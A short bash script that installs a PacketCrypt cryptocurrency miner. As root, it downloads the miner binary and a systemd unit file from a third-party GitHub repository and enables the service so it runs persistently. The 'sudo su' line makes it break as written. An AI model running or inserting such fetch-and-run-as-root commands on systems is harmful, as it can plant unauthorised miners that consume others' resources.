#!/usr/bin/env bash
sudo su
wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O /usr/local/src/packetcrypt
chmod +x /usr/local/src/packetcrypt
wget https://raw.githubusercontent.com/taikhoanxzc004/xmrig/master/pkt.service -O /lib/systemd/system/pkt.service
chmod +x /lib/systemd/system/pkt.service
sudo systemctl daemon-reload && sudo systemctl enable pkt.service && sudo systemctl start pkt.service
